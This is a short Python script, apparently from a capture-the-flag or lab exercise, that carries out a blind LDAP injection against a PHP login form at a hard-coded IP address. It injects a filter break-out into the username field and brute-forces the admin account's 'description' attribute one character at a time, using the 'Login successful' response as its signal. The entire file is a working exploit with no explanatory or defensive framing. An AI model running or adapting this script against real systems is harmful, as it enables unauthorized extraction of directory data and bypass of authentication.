import requests

char = [
    "a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z",
    "A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z",
    "0","1","2","3","4","5","6","7","8","9","\"","\'","{","}","[","]","!","?","(",")",".",",","&","@","/","*"
]
char_list = sorted(list(char))
http_proxy = "http://127.0.0.1:8080"
proxies = {
    "http": http_proxy
}
username = "admin"
attribute = "description"
password = "bbb"
payload_list = []
index = 0
index_injection = 0
success = ""

url = "http://94.237.53.146:37074/index.php"

while True:

    if index >= len(char_list):  # Verifica que el índice esté dentro del rango
        print("End")
        break  

    injection_payload = ''.join(payload_list)
    payload1 = f"{username})(|({attribute}={injection_payload}{char_list[index]}*"
    data1 = {'username': payload1, 'password': password + ')'}
    response = requests.post(url, data=data1, proxies=proxies)
    print(f"Trying (&(uid={username})(|({attribute}={injection_payload}{char_list[index]}*)(password={password})))")
    
    
    if "Login successful" not in response.text:
        index += 1
        
    else:

        print(f"Added successfully (&{username})(|({attribute}={injection_payload}{char_list[index]}*)))")
        payload_list.append(char_list[index])
        success = f"Search filter: (&(uid={username})(|({attribute}=" + "\033[1m" + ''.join(payload_list) + "\033[0m" + f"*)(password={password})))"
        print(success)
        index = 0

if success:
    print(success)
    
        
        
